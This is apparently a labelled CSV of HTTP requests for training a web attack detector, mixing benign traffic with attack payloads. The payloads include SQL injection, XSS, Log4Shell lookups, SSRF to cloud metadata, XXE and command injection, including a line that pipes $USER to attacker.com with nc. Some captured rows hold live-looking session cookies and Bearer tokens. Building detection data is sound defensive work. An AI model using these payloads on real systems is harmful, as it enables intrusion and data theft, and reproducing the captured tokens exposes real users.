method,path,query,headers,body,ua,label
GET,/,,"<svg><script xlink:href=""http://attacker.com/xss.js""></script></svg>",,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,POST /register (detailed user info),,,0
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/api/v1/users,q=' OR 'x'='x,Host: example.com; Accept: */*,,Nmap Scripting Engine,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/nagiosxi/images/th_updown.png,,"Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8; Accept-Encoding: gzip, deflate, br, zstd; Accept-Language: vi,vi-VN;q=0.9,en-US;q=0.8,en;q=0.7; Connection: keep-alive; Cookie: nagiosxi=hm7cas44vrq2v03sqogacvkir2; Host: mts.nagios.vnpay.vn; Referer: https://mts.nagios.vnpay.vn/nagiosxi/includes/css/base.css?1722359920; Sec-Ch-Ua: ""Not(A:Brand"";v=""8"", ""Chromium"";v=""144"", ""Google Chrome"";v=""144""; Sec-Ch-Ua-Mobile: ?0; Sec-Ch-Ua-Platform: ""Windows""; Sec-Fetch-Dest: image; Sec-Fetch-Mode: no-cors; Sec-Fetch-Site: same-origin; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",0
GET,/,,"POST /privacy/consent {""analytics"": true, ""marketing"": false}",,,0
GET,/,,Host: evil.com,,,1
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,dict://localhost:11211/stat,,,1
GET,/,,GET /settings/security,,,0
POST,/login,,Host: example.com; Accept: */*,input=http://169.254.169.254/latest/meta-data,Nikto/2.1.6,1
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,GET /robots.txt,,,0
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,{{7*7}} or {{config.items()}},,,1
GET,/wp-content/plugins/wp-swimteam/include/user/download.php,file=/etc/passwd&filename=/etc/passwd&contenttype=text/html&transient=1&abspath=/usr/share/wordpress,"Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/604.4.15 (KHTML, like Gecko) Version/16.3 Safari/604.4.1",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/604.4.15 (KHTML, like Gecko) Version/16.3 Safari/604.4.1",1
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /images/hero-banner.webp,,,0
GET,/,,"<video><source onerror=""alert(1)"">",,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,Host: evil.com,,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,"{""alg"":""RS256"",""jku"":""http://attacker.com/key.json""}",,,1
GET,/,,php://input,,,1
GET,/,,GET /products/compare?base=p1&target=p2,,,0
GET,/,,url=http://malicious.com,,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,"{""alg"":""none""}",,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,`uname -a`,,,1
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,id=1; DROP TABLE users--,,,1
POST,/checkout,,Host: example.com; Accept: */*,username=user60&password=pass910,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,admin*)(| (password=*)),,,1
GET,/favicon.ico,,,,,0
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,java\tscript:alert(1),,,1
GET,/_next/static/chunks/app/100_shop/[merchant]/[channel]/[subchannel]/[locale]/profile/orders/[slug]/page-90845c391168a8d2.js,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Accept-Language: vi-VN,vi;q=0.9; Connection: keep-alive; Cookie: ttcsid=1770873777070::RDmex4my736ui2XUbmMB.4.1770873798450.0::1.3015.3205::21364.5.48.517::9770.7.29; ttcsid_CQNEHUJC77UD2I8MDM90=1770873777069::_CpUDC6_ni0179CKgXEg.4.1770873798450.1; ttcsid_CQQA2PJC77U11VCBE7G0=1770873777070::L4AGUppCMsi0hpIpVGLQ.4.1770873798445.1; _ga_1XRVJ9DDS6=GS2.1.s1770873776$o14$g1$t1770873781$j55$l0$h0; _fbp=fb.1.1752765056036.815179029400716626; _tt_enable_cookie=1; _ttp=B-KCS0HPMr69avDJCOo3wuxOFpe.tt.1; _ga=GA1.1.613533438.1721032066; _gcl_au=1.1.896754833.1763304416; _ga_3WXM1P55NZ=GS1.1.1737394550.10.1.1737394620.0.0.0; Host: vcb-loyalty.vnshop.vn; Referer: https://vcb-loyalty.vnshop.vn/notifications; User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",,"Mozilla/5.0 (iPhone; CPU iPhone OS 16_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,php://input,,,1
GET,/,,GET /checkout/step1,,,0
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,POST /api/v1/orders (JSON payload),,,0
GET,/api/v1/orders,,Host: example.com; Accept: */*,,Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
GET,/,,GET /newsletter/unsubscribe?token=abc123def456,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=admin'--,curl/7.68.0,1
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,GET /api/v1/dashboard/widgets/sales-chart/data,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,GET /auth/google/callback,,,0
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,DELETE /api/v1/notifications/1024,,,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,cos\nsystem\n(S'id'\ntR.,,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,1
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,query { a: user(id:1) { name } b: user(id:2) { name } },,,1
GET,/,,{smart_f_shell_exec('id')},,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,"<iframe src=""https://target.com"" style=""opacity:0.5""></iframe>",,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,GET /stream/hls/chunk_001.ts,,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,GET /favicon.ico,,,0
GET,/,,<img src=x onerror=alert(1)>,,,1
GET,/,,"[{""query"": ""...""}, {""query"": ""...""}]",,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,id=1; DROP TABLE users--,,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
GET,/favicon.ico,,,,,0
GET,/,,http://169.254.169.254/latest/meta-data/,,,1
GET,/,,; cat /etc/passwd,,,1
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,"POST /api/v1/posts/55/comments {""text"": ""Great article!""}",,,0
GET,/,,..%c0%af..%c0%af..%c0%afetc/passwd,,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
POST,/index.php,,Host: example.com; Accept: */*,input=../../../../etc/passwd,Nikto/2.1.6,1
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,id=1'; WAITFOR DELAY '0:0:5'--,,,1
GET,/,,POST /collect?v=1&tid=UA-XXXXX,,,0
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /sitemap.xml,,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,GET /search?q=C%23,,,0
GET,/,,GET /images/logo.png,,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,"{""alg"":""none""}",,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,HEAD /assets/large-video.mp4,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,POST /newsletter/subscribe,,,0
GET,/,,"{""__proto__"": {""isAdmin"": true}}",,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /api/v1/search/suggest?q=secur,,,0
GET,/,,[Binary Frame] 0x89 (Ping),,,0
GET,/favicon.ico,,,,,0
GET,/,,; cat /etc/passwd,,,1
GET,/,,"#set($str=$class.inspect(""java.lang.Runtime"").type.getRuntime().exec(""id""))",,,1
GET,/web-api/orders/41d834d0-a2cd-484e-b24b-4116283c8769,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzcxNjM3MjMiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiYWMwMTE2ZjYtNTFmMi00OWFhLThlYWUtZGU5N2UyNGEyZWJjIiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzcxNjM3MjMiLCJzdWIiOiJXRUJTSVRFQDA3NzcxNjM3MjMiLCJpYXQiOjE3NzA2MzAyMTgsImV4cCI6MTc3MTIzNTAxOH0.Uc9FWBK8fn7QutXqdt6S1jZGU7hbnuWHnMMt4jzjHoo; Connection: keep-alive; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: 2780534e-da54-4104-b8ff-9f59a7d79137",,python-requests/2.32.5,0
GET,/,,User-Agent: ' OR SLEEP(5) OR ',,,1
GET,/,,HEAD /assets/large-video.mp4,,,0
DELETE,/search,,Host: example.com; Accept: */*,input=' OR 'x'='x,Nmap Scripting Engine,1
GET,/,,query { __schema { types { name } } },,,1
GET,/,,GET /manifest.json,,,0
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /downloads/guide-v2.pdf,,,0
GET,/,,GET /api/v1/ping,,,0
GET,/,,POST /api/v1/user/avatar (multipart/form-data),,,0
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,GET /maps/v2/tile/10/512/324.png,,,0
GET,/,,POST /webhooks/stripe (Payment Success),,,0
GET,/,,GET /api/v1/products,,,0
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
POST,/app,,"Accept-Encoding: gzip, deflate; Connection: close; Content-Length: 518; Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx824508056066; Host: vnpaycloud.vn:80; Next-Action: x; User-Agent: Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36; X-Nextjs-Html-Request-Id: ilovepoop_824508056066; X-Nextjs-Request-Id: poop1234",,"Mozilla/5.0 (Linux; Android 9; AFTWMST22 Build/PS7233; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36",0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
PUT,/search,,Host: example.com; Accept: */*,input=<script>alert(1)</script>,Nmap Scripting Engine,1
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,; cat /etc/passwd,,,1
GET,/,,GET /login,,,0
GET,/,,GET /health,,,0
GET,/,,GET /login,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,GET /api/v1/map/data?lat=21.0285&lng=105.8542&zoom=15,,,0
GET,/,,POST /blog/comment (valid user text),,,0
PUT,/home,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,%0d%0aBcc: victim@example.com,,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,(&(uid=admin)(|(password=*))),,,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,1
GET,/,,"<!ENTITY xxe SYSTEM ""file:///etc/passwd"">",,,1
POST,/products,,Host: example.com; Accept: */*,username=user660&password=pass418,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,$(whoami),,,1
GET,/,,GET /help/kb/search?query=how+to+reset+password,,,0
GET,/,,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,1
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\\a')))",,,1
GET,/,,GET /search?q=O'Reilly,,,0
GET,/,,POST /api/v1/logs/frontend (traceback),,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/admin,q=| cat /etc/passwd,Host: example.com; Accept: */*,,Nikto/2.1.6,1
DELETE,/login,,Host: example.com; Accept: */*,input=&& whoami,Nikto/2.1.6,1
GET,/,,POST /register (detailed user info),,,0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,GET /podcasts/latest.xml,,,0
GET,/,,Host: evil.com,,,1
GET,/,,GET /static/icons/heart.svg,,,0
DELETE,/,,Host: example.com; Accept: */*,,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),0
GET,/,,"POST /api/v1/projects {""name"": ""Security Audit 2026""}",,,0
GET,/,,admin*)(| (password=*)),,,1
GET,/,,"POST /legal/tos/accept {""version"": ""2.1.0""}",,,0
GET,/,,GET /favicon.ico,,,0
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,GET /feed/news.rss,,,0
GET,/,,GET /admin/users?limit=20&offset=40,,,0
GET,/,,GET /api/v1/support/tickets/404/attachments,,,0
GET,/,,"{""id"": {""$bitsAllSet"": [1, 5]}}",,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,POST /blog/comment (valid user text),,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",0
GET,/,,"{""$where"": ""this.user == 'admin'""}",,,1
GET,/,,__proto__[admin]=true,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,GET /search?q=C%23,,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/visualizza_tabelle.php,anno=2021&tipo_tabella=prenotazioni&sel_tab_prenota=tutte&wo03b%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ew5px3=1,Accept: */*; Accept-Encoding: gzip; Accept-Language: en; Connection: close; Host: nagios.vnpay.vn; User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0,,Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,javascript:alert(1),,,1
GET,/,,phar://path/to/malicious.phar/shell.php,,,1
GET,/,,${os.system('id')},,,1
GET,/,,"POST /user/password-update {""old"": ""pass1"", ""new"": ""pass2""}",,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,"POST /api/v1/deliver/kindle {""book_id"": ""b_772""}",,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,id=1'/**/OR/**/'1'='1,,,1
GET,/,,GET /stream/audio/segment_77.aac,,,0
GET,/favicon.ico,,,,,0
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/favicon.ico,,,,,0
GET,/,,GET /dashboard?view=summary&time=30d,,,0
GET,/,,POST /api/v1/login (username/password),,,0
GET,/,,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,,1
GET,/,,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,1
GET,/,,"POST /auth/mfa/verify {""code"": ""123456""}",,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,id=1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'A%')--,,,1
POST,/web-api/orders/260209PVNJJBHUU/paymentUrl,,"Accept: */*; Accept-Encoding: gzip, deflate, br; Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJwaG9uZSI6IjA3NzMyODE4MjIiLCJzY2hhbm5lbCI6IldFQlNJVEUiLCJ1c2VyLWlkIjoiOGVjNmM5MjEtMmE4MC00NmYxLWFjYmYtNzFiZWJhNDhhMjY5IiwidXNlcm5hbWUiOiJXRUJTSVRFQDA3NzMyODE4MjIiLCJzdWIiOiJXRUJTSVRFQDA3NzMyODE4MjIiLCJpYXQiOjE3NzA2MzAyNTksImV4cCI6MTc3MTIzNTA1OX0.qLb6G6TVFj5un0scuaNSbGRxWdSF0uvjPzdme6rWx2o; Connection: keep-alive; Content-Length: 2; Content-Type: application/json; Host: webapi-load.poc.vnshop.cloud; User-Agent: python-requests/2.32.5; X-Request-Id: f04b4fe8-7bdd-4b74-b890-b6becd054863",,python-requests/2.32.5,0
GET,/,,"<iframe srcdoc=""<script>alert(1)</script>"">",,,1
GET,/,,url=http://malicious.com,,,1
GET,/,,${jndi:ldap://attacker.com/a},,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,"PUT /api/v1/user/settings {""avatar_url"": ""https://img.com/u1.png""}",,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,"O:8:""Database"":1:{s:4:""host"";s:9:""localhost"";}",,,1
PUT,/api/v1/users,,Host: example.com; Accept: */*,input=&& whoami,curl/7.68.0,1
GET,/,,"{""$type"": ""System.Windows.Data.ObjectDataProvider, ...""}",,,1
DELETE,/login,,Host: example.com; Accept: */*,"input=' UNION SELECT NULL,NULL--",curl/7.68.0,1
GET,/,,rmi://attacker.com:1099/Exploit,,,1
GET,/,,GET /products?category=electronics&brand=apple,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/,,id=0x27204f52202731273d2731,,,1
GET,/,,gopher://localhost:6379/_SET%20foo%20bar,,,1
GET,/,,"POST /user/ui/theme {""mode"": ""dark""}",,,0
GET,/,,GET /api/v1/products/101,,,0
GET,/,,"POST /contact (name, email, message)",,,0
GET,/,,"POST /api/v1/payment/tokens {""card_last4"": ""4242""}",,,0
GET,/,,GET /search?q=machine+learning+NOT+python,,,0
GET,/,,GET /search?q=machine+learning,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/,,"{""$where"": ""function() { return this.name == 'admin' }""}",,,1
GET,/,,"POST /team/invite {""email"": ""colleague@work.com""}",,,0
GET,/,,id=1&id=2,,,1
GET,/favicon.ico,,,,,0
GET,/,,PATCH /api/v1/settings/theme,,,0
GET,/,,..%2f..%2f..%2fetc%2fshadow,,,1
GET,/,,"<iframe src=""http://169.254.169.254/latest/meta-data/""></iframe>",,,1
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET /auth/verify-email?code=v987654321,,,0
GET,/,,id=1'; EXEC sp_executesql N'WAITFOR DELAY ''0:0:5'''--,,,1
DELETE,/login,,Host: example.com; Accept: */*,"input="" onmouseover=alert(1) """,Nikto/2.1.6,1
GET,/favicon.ico,,,,,0
GET,/,,POST /api/v1/documents (binary stream),,,0
GET,/,,GET /products?sort=price_desc&page=1,,,0
GET,/,,GET /admin/dashboard/users/active,,,0
GET,/,,GET /user/orders?status=shipped&from=2025-01-01,,,0
GET,/,,GET /api/v1/locale/set?lang=en,,,0
GET,/,,%253cscript%253ealert(1)%253c/script%253e,,,1
GET,/,,"POST /reviews {""id"": ""p_50"", ""stars"": 5, ""comment"": ""Amazing quality!""}",,,0
GET,/,,GET /stores/find?zip=10001&distance=10,,,0
GET,/,,%0d%0aSet-Cookie: session=attacker,,,1
GET,/,,"POST /analytics/metric {""event"": ""button_click"", ""label"": ""signup""}",,,0
GET,/,,"<a href=""http://malicious.com"" target=""_blank"">Click here</a>",,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /config/app-settings.json,,,0
GET,/,,${os.system('id')},,,1
GET,/profile,,Host: example.com; Accept: */*,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),0
GET,/,,; /bin/c?t /e*c/p?sswd,,,1
GET,/,,GET /locales/vi-VN.json,,,0
GET,/,,GET /robots.txt,,,0
GET,/favicon.ico,,,,,0
GET,/,,"POST /wishlist/add {""item_id"": ""it_888""}",,,0
GET,/favicon.ico,,,,,0
GET,/,,GET /static/icons/heart.svg,,,0
GET,/favicon.ico,,,,,0
GET,/,,GET / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,,1
GET,/,,class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B,,,1
GET,/,,"<noscript><p title=""</noscript><img src=x onerror=alert(1)>"">",,,1
GET,/,,id=1; SELECT pg_sleep(5)--,,,1
GET,/,,"PATCH /api/v1/messages/500 {""read"": true}",,,0
GET,/,,OPTIONS /api/v1/data,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,$(whoami),,,1
GET,/,,..\..\..\..\windows\system32\config\sam,,,1
GET,/,,; echo $USER | nc attacker.com 1234,,,1
GET,/,,GET /docs/api/introduction,,,0
GET,/,,php://filter/convert.base64-encode/resource=index.php,,,1
GET,/,,expect://id,,,1
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
GET,/,,GET /admin/reports/sales.csv?year=2025,,,0
GET,/favicon.ico,,,,,0
GET,/,,"{""name"": ""__import__('os').system('id')""}",,,1
GET,/,,X-Forwarded-Host: attacker.com,,,1
GET,/,,GET /user/mfa/setup-qr,,,0
GET,/cgi-bin/kerbynet,Action=StartSessionSubmit&User=%27%26cat%20/etc/passwd%26%27&PW,"Accept-Encoding: gzip; Connection: close; Host: atp.vnpay.vn; User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",1
GET,/,,%0als,,,1
PUT,/admin,,Host: example.com; Accept: */*,input=..\..\..\windows\system32,curl/7.68.0,1
GET,/,,expect://id,,,1
GET,/,,POST /auth/password-reset-request,,,0
GET,/,,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,1
